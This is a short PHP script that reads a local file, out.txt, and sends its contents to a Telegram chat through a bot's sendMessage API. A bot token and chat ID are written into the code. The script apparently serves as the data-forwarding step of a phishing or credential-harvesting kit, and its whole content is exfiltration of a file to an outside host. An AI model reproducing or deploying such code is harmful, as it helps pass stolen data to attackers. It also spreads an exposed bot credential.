<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot6826661653:AAFzLaag-V7Z82e9TOr1KMpWH50kd6nG0D8/sendMessage?chat_id=1027568750&text=$msg");
?>